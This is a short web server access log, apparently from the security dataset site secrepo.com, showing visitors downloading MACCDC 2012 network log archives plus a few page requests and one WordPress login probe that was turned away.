138.197.3.83 - - [07/Sep/2018:15:24:46 -0700] "GET / HTTP/1.1" 200 12383 "http://secrepo.com/" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
138.197.3.83 - - [07/Sep/2018:15:24:46 -0700] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 200 45019 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
138.197.3.83 - - [07/Sep/2018:15:24:47 -0700] "GET /maccdc2012/ftp.log.gz HTTP/1.1" 200 128116 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
138.197.3.83 - - [07/Sep/2018:15:24:48 -0700] "GET /maccdc2012/notice.log.gz HTTP/1.1" 200 20779 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
138.197.3.83 - - [07/Sep/2018:15:24:48 -0700] "GET /maccdc2012/signatures.log.gz HTTP/1.1" 200 605 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
138.197.3.83 - - [07/Sep/2018:15:24:48 -0700] "GET /maccdc2012/smtp.log.gz HTTP/1.1" 200 6908 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
138.197.3.83 - - [07/Sep/2018:15:24:46 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 3971299 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
138.197.3.83 - - [07/Sep/2018:15:24:47 -0700] "GET /maccdc2012/files.log.gz HTTP/1.1" 200 2423434 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
138.197.3.83 - - [07/Sep/2018:15:24:47 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 2480161 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
138.197.3.83 - - [07/Sep/2018:15:24:48 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 843154 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
138.197.3.83 - - [07/Sep/2018:15:24:48 -0700] "GET /maccdc2012/ssh.log.gz HTTP/1.1" 200 58080 "http://www.secrepo.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
45.116.214.1 - - [07/Sep/2018:15:27:11 -0700] "GET / HTTP/1.1" 200 46156 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36" 
92.243.182.161 - - [07/Sep/2018:15:30:03 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
92.243.182.161 - - [07/Sep/2018:15:30:03 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
41.223.160.173 - - [07/Sep/2018:15:34:16 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
18.219.142.57 - - [07/Sep/2018:15:44:03 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
